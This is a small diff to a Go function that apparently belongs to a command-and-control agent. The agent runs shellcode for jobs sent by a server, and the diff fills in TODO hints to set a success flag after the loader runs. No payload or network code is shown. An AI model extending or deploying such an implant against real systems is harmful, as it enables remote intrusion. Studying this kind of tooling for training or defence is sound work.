@@ -78,13 +78,13 @@ func (agent *Agent) orchestrateShellcode(job *models.ServerResponse) models.Agen
 		log.Printf(loaderError)
 		finalResult.Error = errors.New(loaderError)
 		// TODO: Set finalResult.Success to false when there's an error
-		// Hint: finalResult.Success = false
+		finalResult.Success = false
 
 	} else {
 		log.Printf("|👊 SHELLCODE SUCCESS| Shellcode execution initiated successfully for TaskID %s. Loader Message: %s",
 			job.JobID, shellcodeResult.Message)
 		// TODO: Set finalResult.Success to true when execution succeeds
-		// Hint: finalResult.Success = true
+		finalResult.Success = true
 	}
 
 	return finalResult
